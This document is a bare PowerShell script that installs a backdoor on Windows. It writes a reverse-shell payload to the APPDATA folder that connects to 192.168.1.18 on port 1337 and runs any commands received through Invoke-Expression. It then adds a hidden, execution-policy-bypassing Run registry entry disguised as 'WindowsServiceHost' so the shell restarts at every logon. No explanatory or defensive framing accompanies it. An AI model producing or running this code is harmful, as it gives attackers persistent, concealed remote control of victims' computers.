$ip = "192.168.1.18"
$port = 1337
$scriptPath = "$env:APPDATA\backdoor.ps1"

$payload = @'
try {
    $client = New-Object System.Net.Sockets.TCPClient("192.168.1.18", 1337)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true
    $buffer = New-Object byte[] 1024
    $encoding = New-Object System.Text.ASCIIEncoding
    $currentPath = Get-Location

    # Identification machine
    $writer.WriteLine("[+] Connected from $env:COMPUTERNAME (Windows)")

    while (($i = $stream.Read($buffer, 0, 1024)) -ne 0) {
        $cmd = $encoding.GetString($buffer, 0, $i).Trim()

        if ($cmd -eq "exit") {
            break
        }

        $prompt = "PS $($currentPath.Path)> $cmd`n"

        try {
            Set-Location $currentPath.Path
            $output = Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            $output = $_.Exception.Message
        }

        $currentPath = Get-Location
        $fullOutput = $prompt + $output
        $writer.WriteLine($fullOutput)
    }

    $writer.Close()
    $stream.Close()
    $client.Close()
} catch {
    exit
}
'@

Set-Content -Path $scriptPath -Value $payload

# Persistance
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsServiceHost"
Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
